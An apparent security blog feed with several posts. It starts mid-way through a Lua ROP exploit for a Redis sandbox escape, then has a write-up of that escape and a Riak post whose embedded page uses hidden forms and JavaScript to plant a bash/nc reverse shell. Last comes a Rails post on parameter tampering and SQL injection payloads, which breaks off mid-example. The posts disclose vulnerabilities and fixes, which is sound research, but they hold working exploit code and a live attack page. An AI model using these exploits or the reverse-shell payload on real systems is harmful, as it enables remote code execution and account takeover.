</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprbxpopr14poprbp</span><span class="p">,</span> <span class="n">poprbp</span><span class="p">,</span> <span class="n">rdx_read_write</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">movrdxr14callrbx</span><span class="p">,</span>
</span><span class='line'>           <span class="n">mprotect_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprdipoprbp</span><span class="p">,</span> <span class="n">old_jump_buf_addr</span><span class="p">,</span> <span class="n">dummy</span><span class="p">,</span>
</span><span class='line'>           <span class="n">longjmp_addr</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>           <span class="s2">&quot;</span><span class="squot;</span>
</span><span class='line'>         <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">payload_str</span> <span class="o">=</span> <span class="nb">table.concat</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">payload_string_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">cstring</span><span class="p">(</span><span class="n">payload_str</span><span class="p">),</span> <span class="mi">4096</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] new sp &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">payload_string_addr</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">--[[ TODO: we always seem to get back strings that are correctly 16 byte aligned. handle unaligned strings? ]]</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">string.byte</span><span class="p">(</span><span class="n">payload_string_addr</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span> <span class="o">~=</span> <span class="mi">8</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">payload not aligned&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">write_word</span><span class="p">(</span><span class="n">jmp_buf_sp</span><span class="p">,</span> <span class="n">payload_string_addr</span><span class="p">)</span>
</span><span class='line'>  <span class="n">write_word</span><span class="p">(</span><span class="n">jmp_buf_eip</span><span class="p">,</span> <span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprdipoprbp</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">--[[ you can also overwrite the SP at stackpointer - 16 .</span>
</span><span class='line'><span class="cm">  but if we corrupt long jump then it is possible to return back into redis :) ]]</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] executing payload&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="nb">error</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">wat&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">coroutine.resume</span><span class="p">(</span><span class="n">co</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] resumed normal redis execution&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">collectgarbage</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">42</span>
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Redis EVAL Lua Sandbox Escape]]></title>
    <link href="http://benmmurphy.github.com/blog/2015/06/04/redis-eval-lua-sandbox-escape/"/>
    <updated>2015-06-04T09:52:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2015/06/04/redis-eval-lua-sandbox-escape</id>
    <content type="html"><![CDATA[<p>It is possible to break out of the Lua sandbox in Redis and execute arbitrary
code. This vulnerability is not new and is heavily based on
<a href="https://www.youtube.com/watch?v=OSMOTDLrBCQ">Peter Cawley&#8217;s work</a> with Lua bytecode
<a href="https://gist.github.com/corsix/6575486">type confusion</a>.</p>

<p>This shouldn&#8217;t pose a threat to users under the trusted Redis security model
where only trusted users can connect to the database. However, in real
deployments there could be databases that can be accessed by untrusted users.
The main deployments that are vulnerable are developers machines, places where
redis servers can be reached via SSRF attacks and cloud hosting.</p>

<p><a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a> have been released to fix this issue.</p>

<h1>Vulnerable Deployments</h1>

<h2>Developers Machines</h2>

<p>Developers machines may be vulnerable because they bind Redis to all interfaces
which used to be the default listen directive in the Redis configuration.</p>

<p>Developers may also be vulnerable even if they bind to 127.0.0.1 because Redis
is effectively a HTTP server. The first mention of attacking Redis via HTTP I
could find is by <a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Nicolas Grégoire</a>
where he documents attacking a Redis server on a Facebook property using a SSRF
vulnerability.</p>

<p>Because Redis is a HTTP server the same origin policies of browsers will allow
any website on the internet to send a POST request to it. When using XHR the
body is completely controllable. For example if you run the following in the
console of your webbrowser while running wireshark:</p>

<pre><code>var x = new XMLHttpRequest();
x.open("POST", "http://127.0.0.1:6379");
x.send('eval "print(\\"hello\\")" 0\r\n');
</code></pre>

<p>In wireshark you will see:</p>

<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:6379
Connection: keep-alive
Content-Length: 27
Pragma: no-cache
Cache-Control: no-cache
Origin: http://www.agarri.fr
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8

eval "print(\"hello\")" 0
-ERR unknown command 'POST'
-ERR unknown command 'Host:'
-ERR unknown command 'Connection:'
-ERR unknown command 'Content-Length:'
-ERR unknown command 'Pragma:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Origin:'
-ERR unknown command 'User-Agent:'
-ERR unknown command 'Content-Type:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Referer:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Accept-Language:'
$-1
</code></pre>

<p>And in the stdout for Redis you will see:</p>

<pre><code>hello
</code></pre>

<p>The attacker is not able to read the response from the server because of the
same origin policy. However, this might be worked around by using a <a href="https://miki.it/blog/2015/4/20/the-power-of-dns-rebinding-stealing-wifi-passwords-with-a-website/">DNS rebinding attack</a>.
Even with DNS rebinding it might not be possible to read the response because
the response is not valid HTTP.</p>

<p>However, reading the response is not necessary because you can package a super generic
exploit that checks the result of the redis.call(&#8220;INFO&#8221;) command and then
launches a OS/architecture specific payload.</p>

<h2>SSRF attacks</h2>

<p>This is similar to attacking developers except a trusted server is tricked into
making a request to the Redis server However, you need a lot of control over
the body which might not often be possible depending on how the body is encoded.</p>

<h2>Redis Cloud Hosting</h2>

<p>This will only effect providers where people running arbitrary code from the
Redis process is not part of their threat model. The major players in this area
look like they are using sandboxing. For example the pids returned by &#8216;INFO&#8217; on
heroku are very low &lt;10 which indicates they are running the Redis servers in
containers. You can already run arbitrary code in containers via dynos on Heroku
so running arbitrary code in a Redis container is probably not useful for an
attacker. Amazon Elasticcache also looks like it uses linux containers.</p>

<p>Similarily, it looks like Microsoft&#8217;s hosted Redis solution runs in an
isolated VM. Redis &#8216;INFO&#8217; returns a virtual os string and it takes ~15
minutes to launch an instance. If MS aren&#8217;t running in an isolated VM then the
15 minute startup time is very weird.</p>

<p>This will be a problem if a hosting provider runs a whole bunch of redis
processes on the same machine/same VM from different customers without any
kind of isolation.</p>

<h1>Exploit</h1>

<p><a href="https://gist.github.com/corsix/6575486">Peter Cawley</a> has found that the
loadstring function can be used to load bytecode that is unsafe. He has
created three very useful lua exploit primitives that make exploitation easy.</p>

<p>First is a way of reading the Value contained in a TValue struct. This allows
reading the pointer value from a lua tagged value. Some pointer values are
already public (using tostring) but there doesn&#8217;t seem to be a way to get the
pointer value for a lua string so this is useful.</p>

<p>Second is a way of reading 8 bytes from an arbitrary memory address.</p>

<p>Third is a way of writing 8 bytes to an arbitrary memory address.</p>

<p>Using the arbitrary memory read it is possible to leak the address of a known
C function. From the address of this c-function it is possible to find the base
address of the redis-server binary. From this base address it is possible to
find pointers to libc/libsystem_c functions and to find the base address of the
libc/libsystem_c libraries. From these libraries it is possible to find the
addresses of useful exported functions (longjump/system) and ROP gadgets. This
technique is similar to pwntools <a href="http://pwntools.readthedocs.org/en/latest/dynelf.html">dynelf</a></p>

<p>The arbitrary memory read is also used to leak an address inside the stack. The
lua_State object holds a long_jump variable that references a long_jump buffer
that is allocated on the stack. This leaks the stack address which can be useful
if you just want to corrupt the stack or the rsp and rip can be overwritten in
the longjump buf to directly take control when longjump is called. OSX has no
pointer mangling protections so this is quite easy to corrupt.</p>

<p>On linux the rip and rsp (and rbp) values are mangled. However, if you have full
read access to the memory you can reverse the secret cookie value to corrupt
the values. Also, linux prevents you from longjmp&#8217;ing to an invalid stack frame
(ie: the heap) but you can longjump to point the stack inside the longjump
buffer then pivot the stack into the heap. This is not really necessary if you
don&#8217;t care about corrupting the stack and crashing the redis process but if you
longjump and don&#8217;t corrupt the stack then you can resume normal execution of
redis after the exploit has finished running.</p>

<h1>Exploitability</h1>

<p>I have exploits for Linux 64 bit and OSX 64 bit. Both exploits take care to not
crash the redis server during successful execution. They will make a call to
system() then go back to normal redis execution.</p>

<p>I have run the Linux exploit on the Amazon RHEL Image (PIE enabled) and the
Amazon 14.04 Ubuntu Image (no PIE). I believe the exploit will work on most
modern Linux 64 bit systems (I suspect it will not work if you compile libc with
 fomit-frame-pointer but this can be worked around). It does not use any
hardcoded addresses from libc or the Redis binary.</p>

<p>The OSX version I have only tested on Yosemite but an earlier version was
working on Mavericks and I believe the Yosemite version works on both. This has
been tested with two different Redis versions and similarily does not depend on
hardcoded address from libsystem_c or the Redis binary. However, it uses
addresses from libsystem_c to speed up the exploit.</p>

<h1>Workarounds</h1>

<p>The best option is to set a strong password on Redis. Systems that are reachable
via HTTP without a password are a problem waiting to happen.</p>

<p>It is also possible to rename the EVAL command. If you are not using EVAL this
is a good option but you still might be at risk of someone modifying your Redis
data via HTTP SSRF attacks.</p>

<p>Upgrading to <a href="https://groups.google.com/forum/#!msg/redis-db/4Y6OqK8gEyk/Dg-5cejl-eUJ">Redis 2.8.21 and 3.0.2</a>
will also fix this issue but I still strongly recommend using password
authentication on Redis systems.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Riak Drive by Attack]]></title>
    <link href="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/"/>
    <updated>2013-09-01T21:29:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack</id>
    <content type="html"><![CDATA[<h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>

<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>

<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>

<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>

<p>The attack will perform the following actions</p>

<ol>
<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
</ol>


<p>By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause.</p>

<p>Click ‘Hack Me’ below to start the attack.</p>

<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>




<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
  <input name='lols' type='hidden' value='lols' />
</form></p>




<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>




<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
</form></p>




<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>




<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
</form>
<input id='hack_me' type='button' value='Hack Me' /></p>




<script type='text/javascript'>
  //&lt;![CDATA[
    $("#hack_me").click(function() {
        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
            $("#insert_record_form")[0].submit();
            setTimeout(write_file, 1000);
        }
    });
    
    function write_file() {
        $("#write_file_form")[0].submit();
        setTimeout(evaluate_file, 1000);           
    }
    
    function evaluate_file() {
        $("#evaluate_file_form")[0].submit();          
    }
  //]]&gt;
</script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Abusing Dynamic Types For Fun And Profit]]></title>
    <link href="http://benmmurphy.github.com/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/"/>
    <updated>2012-05-15T11:39:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit</id>
    <content type="html"><![CDATA[<p>Most Rails applications don&#8217;t properly sanitise user input when passing it to queries (UPDATE: Rails has fixed the problems raised in this article so it was mostly a Rails problem rather than an application programmer problem). I&#8217;m going to use an example to illustrate this problem.</p>

<h2>The Scenario</h2>

<p>Johnny has been tasked to add a password reset feature to his Rails application. So he adds a reset_token to his User model and a PasswordsController class to the application. When the user forgets their password they type in their email and a reset_token is generated and saved on the User model and a url containing the reset token is sent to the users email address. The url looks like <code>/users/1/passwords/edit?reset_token=kjksldjflskdjf</code>. This reset token is then checked when the user resets their password. Johnny writes the following code in the PasswordsController:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Johnny deploys this new feature to the staging environment and Mary is given the task to test it. Now Mary is quite clever and checks what happens if she removes the reset_token parameter from the url and changes the user id. She visits the url <code>/users/2/passwords/edit</code> and finds that she can change the password for any user that has not requested their password to be reset. She raises this as a critical bug.</p>

<p>Johnny reproduces the problem on his machine and notices it is is doing the following query:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">reset_token</span><span class="sb">` IS NULL LIMIT 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>He realises he needs to stop users from not sending the reset_token parameter because if <code>params[:reset_token]</code> is <code>nil</code> then they can update any user who hasn&#8217;t requested a password reset. He updates the code in PasswordController to the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>    <span class="k">return</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Mary tries her trick again but it doesn&#8217;t work this time. But Mary has more tricks in her bag and this time she uses the url <code>/users/2/passwords/edit?reset_token[]</code> . Again she is able to change the password for any user that has not had a reset_token generated.</p>

<p>Johnny reproduces the problem on his machine and sees it doing the same query:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="n">reset_token</span><span class="sb">` IS NULL LIMIT 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>Johnny is completely stumped as to how nil.blank? could be false. He adds some logging and finds the <code>params[:reset_token]</code> is actually an array containing a nil element: <code>[nil]</code>. He decides to fix the problem by calling <code>to_s</code> on the query parameters.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>    <span class="k">return</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">find_by_id_and_reset_token</span><span class="p">(</span>
</span><span class='line'>                 <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">].</span><span class="n">to_s</span><span class="p">,</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">to_s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Not Just Arrays (SQL Manipulation)</h2>

<p>If Johnny had a used the <code>where</code> function instead of <code>find_by_</code> then an attacker could have exploited it by passing in a <code>Hash</code> instead of an <code>Array</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">update</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">].</span><span class="n">blank?</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>    <span class="k">return</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="vi">@user</span> <span class="o">=</span> <span class="no">User</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="ss">:id</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:user_id</span><span class="o">]</span><span class="p">,</span> <span class="ss">:reset_token</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:reset_token</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">first</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="vi">@user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:user</span><span class="o">][</span><span class="ss">:password</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>    <span class="n">redirect_to</span><span class="p">(</span><span class="n">url_after_update</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">flash_failure_after_update</span>
</span><span class='line'>    <span class="n">render</span> <span class="ss">:template</span> <span class="o">=&gt;</span> <span class="s1">&#39;passwords/edit&#39;</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>For example Mary could of sent the url <code>/users/2/passwords/edit?reset_token[users.id]=2</code>. The query then performed would have been:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">User</span> <span class="no">Load</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">2</span><span class="n">ms</span><span class="p">)</span>  <span class="no">SELECT</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">*</span> <span class="no">FROM</span> <span class="sb">`users`</span> <span class="no">WHERE</span> <span class="sb">`users`</span><span class="o">.</span><span class="n">`</span><span class="nb">id</span><span class="sb">` = 2 </span>
</span><span class='line'><span class="sb">  AND `</span><span class="n">users</span><span class="sb">`.`</span><span class="nb">id</span><span class="sb">` = 2 LIMIT 1</span>
</span></code></pre></td></tr></table></div></figure>


<p>The user is able to change the token filter to a filter on a column of their choice. On previous versions of Rails this attack can be escalated
to arbitrary SQL injection. This attack uses the <a href="https://groups.google.com/group/rubyonrails-security/browse_thread/thread/6a1e473744bc389b">previously fixed issue</a> of SQL injection in table names and columns. This bug was originally not
as serious because you would not normally let a user choose arbitrary columns or table names in a query. However, with the SQL Manipulation bug an
attacker is now able to change table and column names to perform SQL injection.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">params</span><span class="o">[</span><span class="ss">:role_id</span><span class="o">]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;user_details.id` = 1 or 1 = 1); -- &quot;</span> <span class="o">=&gt;</span> <span class="mi">1</span><span class="p">}</span>
</span><span class='line'><span class="no">UserDetail</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="ss">:all</span><span class="p">,</span> <span class="ss">:conditions</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="ss">:role_id</span> <span class="o">=&gt;</span> <span class="n">params</span><span class="o">[</span><span class="ss">:role_id</span><span class="o">]</span><span class="p">})</span>
